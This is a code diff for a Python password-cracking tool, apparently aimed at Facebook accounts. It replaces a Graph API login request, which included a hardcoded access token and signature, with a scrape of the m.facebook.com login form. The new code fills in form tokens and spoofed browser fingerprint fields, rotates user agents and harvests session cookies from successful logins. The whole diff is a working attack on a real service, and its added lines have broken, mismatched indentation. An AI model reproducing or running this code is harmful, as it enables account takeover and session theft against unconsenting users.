@@ -3,6 +3,7 @@ import os, sys, re, time, requests, calendar, random, bs4, uuid, json, subproces
 from concurrent.futures import ThreadPoolExecutor
 from bs4 import BeautifulSoup as parser
 from datetime import date,datetime
+from time import time as mek
 from requests.exceptions import ConnectionError
 ses = requests.Session()
 
@@ -459,27 +460,46 @@ class Crack:
 			for pw in pwx:
 				pw = pw.lower()
 				ua = random.choice(ugent)
-				params = {
-					"access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16",
-					"sdk_version": {random.randint(1,26)}, 
-					"email": email,
-					"locale": "en_US",
-					"password": pw,
-					"sdk": "android",
-					"generate_session_cookies": "1",
-					"sig": "4f648f21fb58fcd2aa1c65f35f441ef5"
-				}
-				headers = {
-					"Host": "graph.facebook.com",
-					"x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),
-					"x-fb-sim-hni": str(random.randint(20000, 40000)),
-					"x-fb-net-hni": str(random.randint(20000, 40000)),
-					"x-fb-connection-quality": "EXCELLENT",
-					"user-agent": ua,
-					"content-type": "application/x-www-form-urlencoded",
-					"x-fb-http-engine": "Liger"
-				}
-				post = ses.post("https://graph.facebook.com/auth/login",params=params, headers=headers, allow_redirects=False)
+				ses = requests.Session()
+        link = ses.get("https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8")
+                 params = {
+                    "m_ts": re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),
+                    "li": re.search('name="li" value="(.*?)"', str(link.text)).group(1),
+                    "try_number": "0",
+                    "unrecognized_tries": "0",
+                    "email": email,
+                    "prefill_contact_point": f"{email} {pw}",
+                    "prefill_source": "browser_dropdown",
+                    "prefill_type": "password",
+                    "first_prefill_source": "browser_dropdown",
+                    "first_prefill_type": "contact_point",
+                    "had_cp_prefilled": True,
+                    "had_password_prefilled": True,
+                    "is_smart_lock": False,
+                    "bi_xrwh": re.search('name="bi_xrwh" value="(.*?)"', str(link.text)).group(1),
+                    "bi_wvdp": '{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
+                    "encpass": f"#PWD_BROWSER:0:{str(mek()).split('.')[0]}:{pw}",
+                    "jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
+                    "lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1)
+                
+                 }
+                 headers = {
+                    "Host": "m.facebook.com",
+                    "content-length": f"{str(len(params))}",
+                    "x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
+                    "user-agent": ua,
+                    "content-type": "application/x-www-form-urlencoded",
+                    "accept": "*/*",
+                    "origin": "https://m.facebook.com",
+                    "x-requested-with": "mark.via.gp",
+                    "sec-fetch-site": "same-origin",
+                    "sec-fetch-mode": "cors",
+                    "sec-fetch-dest": "empty",
+                    "referer": "https://m.facebook.com/login/?ref=dbl&fl&login_from_aymh=1",
+                    "accept-encoding": "gzip, deflate",
+                    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
+                    }
+                 post = ses.post("https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100", params=params, headers=headers, allow_redirects=False)
 				if "session_key" in post.text and "EAA" in post.text:
 					coki = ";".join(i["name"]+"="+i["value"] for i in post.json()["session_cookies"])
 					user = re.findall("c_user=(\d+)",coki)[0]
